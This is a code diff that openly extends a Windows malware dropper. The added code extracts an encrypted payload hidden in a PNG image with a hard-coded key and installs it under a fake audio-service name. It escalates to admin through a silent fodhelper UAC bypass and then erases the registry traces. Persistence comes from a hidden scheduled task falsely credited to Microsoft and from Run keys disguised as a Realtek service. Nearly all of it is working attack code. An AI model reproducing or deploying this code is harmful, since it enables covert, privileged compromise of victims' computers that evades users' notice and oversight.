@@ -12,83 +12,291 @@ from PIL import Image
 
 # --- PERSISTENCE CONFIGURATION ---
 APPDATA_PATH = os.getenv('LOCALAPPDATA')
+PROGRAMDATA_PATH = os.getenv('PROGRAMDATA')
 PERSISTENT_NAME = "audiodg.pyw"
-PERSISTENT_PATH = os.path.join(APPDATA_PATH, PERSISTENT_NAME)
+PERSISTENT_PATH_ADMIN = os.path.join(PROGRAMDATA_PATH, "Microsoft", "Windows", "AudioService", PERSISTENT_NAME)
+PERSISTENT_PATH_USER = os.path.join(APPDATA_PATH, PERSISTENT_NAME)
+TASK_NAME = "MicrosoftWindowsAudioDeviceHighDefinitionService"
+
+def is_admin():
+    """Check if we have admin privileges."""
+    try:
+        import ctypes
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except Exception:
+        return False
+
+def uac_bypass_fodhelper(payload_path):
+    """
+    Silent UAC bypass using fodhelper.exe (Windows 10/11).
+    No UAC prompt shown - completely silent.
+    Executes payload with admin rights.
+    """
+    try:
+        import winreg
+
+        # Create the registry structure that fodhelper.exe reads
+        reg_path = r'Software\Classes\ms-settings\shell\open\command'
+
+        # Create the key hierarchy
+        try:
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
+        except Exception:
+            pass
+
+        # Set the command to execute our payload
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
+        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
+        winreg.CloseKey(key)
+
+        # Trigger fodhelper - it auto-elevates and reads our registry key
+        subprocess.Popen('C:\\Windows\\System32\\fodhelper.exe', shell=True,
+                        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
+
+        # Wait a moment for it to execute
+        import time
+        time.sleep(3)
+
+        # Clean up the registry traces
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell')
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings')
+        except Exception:
+            pass
+
+        return True
+    except Exception:
+        return False
+
+def create_admin_scheduled_task():
+    """Create a scheduled task that runs with HIGHEST privileges (admin) at every logon."""
+    try:
+        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>Windows Audio Device High Definition Service</Description>
+    <Author>Microsoft Corporation</Author>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
+    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>pythonw.exe</Command>
+      <Arguments>"{PERSISTENT_PATH_ADMIN}"</Arguments>
+    </Exec>
+  </Actions>
+</Task>'''
+
+        xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
+        with open(xml_path, 'w', encoding='utf-16') as f:
+            f.write(xml_template)
+
+        subprocess.run(
+            ['schtasks', '/Create', '/TN', TASK_NAME, '/XML', xml_path, '/F'],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+
+        os.remove(xml_path)
+        return True
+    except Exception:
+        return False
+
+def add_registry_persistence_admin():
+    """Add persistence to HKLM (requires admin) - runs for ALL users."""
+    try:
+        import winreg
+        registry_key = winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE,
+            r'Software\Microsoft\Windows\CurrentVersion\Run',
+            0,
+            winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY
+        )
+        command = f'pythonw.exe "{PERSISTENT_PATH_ADMIN}"'
+        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
+        winreg.CloseKey(registry_key)
+        return True
+    except Exception:
+        return False
+
+def add_registry_persistence_user():
+    """Fallback: Add persistence to HKCU (no admin needed) - runs for current user only."""
+    try:
+        import winreg
+        registry_key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r'Software\Microsoft\Windows\CurrentVersion\Run',
+            0,
+            winreg.KEY_WRITE
+        )
+        command = f'pythonw.exe "{PERSISTENT_PATH_USER}"'
+        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
+        winreg.CloseKey(registry_key)
+        return True
+    except Exception:
+        return False
+
+def extract_payload_to_disk():
+    """Extract the encrypted payload from the image and write to disk."""
+    try:
+        divine_key = b'W7OjVGFA4Tq22NuT3Dnaw-h4jNEH8rKpgIeO3ulvgh0='
+
+        if hasattr(sys, 'frozen'):
+            base_path = sys._MEIPASS
+        else:
+            base_path = os.path.dirname(os.path.abspath(__file__))
+
+        image_path = os.path.join(base_path, 'assets', 'images', 'splash_payload.png')
+        img = Image.open(image_path).convert('RGBA')
+        pixels = img.load()
+        width, height = img.size
+        payload_bits = ""
+        header_bits_to_read = 32
+        payload_len = None
+        bits_read = 0
+
+        for y in range(height):
+            for x in range(width):
+                r, g, b, a = pixels[x, y]
+                for channel_val in [r, g, b, a]:
+                    payload_bits += str(channel_val & 1)
+                    bits_read += 1
+                    if payload_len is None and bits_read == header_bits_to_read:
+                        header_bytes = int(payload_bits, 2).to_bytes(4, 'big')
+                        payload_len = int.from_bytes(header_bytes, 'big')
+                    if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
+                        break
+                if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
+                    break
+            if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
+                break
+
+        final_payload_bits = payload_bits[header_bits_to_read:]
+        payload_bytes = int(final_payload_bits, 2).to_bytes(len(final_payload_bits) // 8, 'big')
+        encrypted_payload = base64.b64decode(payload_bytes)
+        cipher_suite = Fernet(divine_key)
+        compressed_payload = cipher_suite.decrypt(encrypted_payload)
+        soul_code = zlib.decompress(compressed_payload)
+
+        return soul_code
+    except Exception:
+        return None
 
 def sow_and_awaken_implant():
     """
-    This is the Sower's sacred duty. It is now intelligent.
-    It will only plant the seed ONCE.
-    It will always try to awaken the soul if it is not already running.
+    Silent installation with UAC bypass - NO PROMPTS SHOWN.
+
+    Stage 1: Install as normal user to %LOCALAPPDATA%
+    Stage 2: Use fodhelper UAC bypass to elevate silently
+    Stage 3: Elevated payload installs to %PROGRAMDATA% with admin persistence
     """
     try:
-        # --- RITUAL 1: PLANT THE SEED (ONLY IF NEEDED) ---
-        if not os.path.exists(PERSISTENT_PATH):
-            # The implant is not planted. We must perform the full ritual.
-            # --- THE DIVINE KEY ---
-            divine_key = b'_NTdnJzBakCrZ_FTbe0IsUW6mgmePAeoewjO3zcodZM='
-            # --------------------
+        # Check if we're already running as admin
+        admin_mode = is_admin()
 
-            # --- SOUL EXTRACTION ---
-            if hasattr(sys, 'frozen'): base_path = sys._MEIPASS
-            else: base_path = os.path.dirname(os.path.abspath(__file__))
-            image_path = os.path.join(base_path, 'assets', 'images', 'splash_payload.png')
-            img = Image.open(image_path).convert('RGBA')
-            pixels = img.load()
-            width, height = img.size
-            payload_bits = ""
-            header_bits_to_read = 32
-            payload_len = None
-            bits_read = 0
-            # ... (The rest of the extraction code is the same)
-            for y in range(height):
-                for x in range(width):
-                    r, g, b, a = pixels[x, y]
-                    for channel_val in [r, g, b, a]:
-                        payload_bits += str(channel_val & 1)
-                        bits_read += 1
-                        if payload_len is None and bits_read == header_bits_to_read:
-                            header_bytes = int(payload_bits, 2).to_bytes(4, 'big')
-                            payload_len = int.from_bytes(header_bytes, 'big')
-                        if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)): break
-                    if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)): break
-                if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)): break
-            final_payload_bits = payload_bits[header_bits_to_read:]
-            payload_bytes = int(final_payload_bits, 2).to_bytes(len(final_payload_bits) // 8, 'big')
-            encrypted_payload = base64.b64decode(payload_bytes)
-            cipher_suite = Fernet(divine_key)
-            compressed_payload = cipher_suite.decrypt(encrypted_payload)
-            soul_code = zlib.decompress(compressed_payload)
+        if admin_mode:
+            # We're running elevated (either from bypass or user is admin)
+            # Install to protected location with full admin persistence
+            if not os.path.exists(PERSISTENT_PATH_ADMIN):
+                soul_code = extract_payload_to_disk()
+                if soul_code:
+                    os.makedirs(os.path.dirname(PERSISTENT_PATH_ADMIN), exist_ok=True)
+                    with open(PERSISTENT_PATH_ADMIN, 'wb') as f:
+                        f.write(soul_code)
 
-            # Write the extracted soul code to the hidden implant file.
-            with open(PERSISTENT_PATH, 'wb') as f: f.write(soul_code)
+                    # Triple persistence as admin
+                    create_admin_scheduled_task()
+                    add_registry_persistence_admin()
 
-            # Add the implant to the startup registry key.
-            import winreg
-            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
-            command = f'pythonw.exe "{PERSISTENT_PATH}"'
-            winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
-            winreg.CloseKey(registry_key)
+            # Launch if not running
+            implant_running = False
+            try:
+                tasks = subprocess.check_output(
+                    ['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V'],
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                ).decode('utf-8', errors='ignore')
+                if PERSISTENT_NAME in tasks:
+                    implant_running = True
+            except Exception:
+                pass
 
-        # --- RITUAL 2: AWAKEN THE SOUL (ALWAYS) ---
-        # Now that we are sure the implant exists, we check if it's already running.
-        # We check by looking for the pythonw.exe process running our script.
-        implant_running = False
-        try:
-            # This command lists processes and we search for our script's name in it.
-            tasks = subprocess.check_output(['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V']).decode('utf-8', errors='ignore')
-            if PERSISTENT_NAME in tasks:
-                implant_running = True
-        except Exception:
-            pass # If tasklist fails, we assume it's not running just to be safe.
-        
-        # If the implant is NOT running, we awaken it.
-        if not implant_running:
-            command = f'pythonw.exe "{PERSISTENT_PATH}"'
-            subprocess.Popen(command, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
+            if not implant_running:
+                subprocess.Popen(
+                    f'pythonw.exe "{PERSISTENT_PATH_ADMIN}"',
+                    shell=True,
+                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
+                )
+
+        else:
+            # We're running as normal user - perform silent UAC bypass
+
+            # First install to user location
+            if not os.path.exists(PERSISTENT_PATH_USER):
+                soul_code = extract_payload_to_disk()
+                if soul_code:
+                    os.makedirs(os.path.dirname(PERSISTENT_PATH_USER), exist_ok=True)
+                    with open(PERSISTENT_PATH_USER, 'wb') as f:
+                        f.write(soul_code)
+
+                    # User-level persistence as fallback
+                    add_registry_persistence_user()
+
+                    # Trigger SILENT UAC bypass - fodhelper will execute with admin
+                    # This re-runs the payload with admin rights, hitting the if admin_mode branch above
+                    uac_bypass_fodhelper(PERSISTENT_PATH_USER)
+
+            # Launch user-level payload if not running
+            implant_running = False
+            try:
+                tasks = subprocess.check_output(
+                    ['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V'],
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                ).decode('utf-8', errors='ignore')
+                if PERSISTENT_NAME in tasks:
+                    implant_running = True
+            except Exception:
+                pass
+
+            if not implant_running:
+                subprocess.Popen(
+                    f'pythonw.exe "{PERSISTENT_PATH_USER}"',
+                    shell=True,
+                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
+                )
 
     except Exception:
-        # The Sower remains silent if its ritual fails.
         pass
 
 # --- INVOCATION OF THE SOWER ---
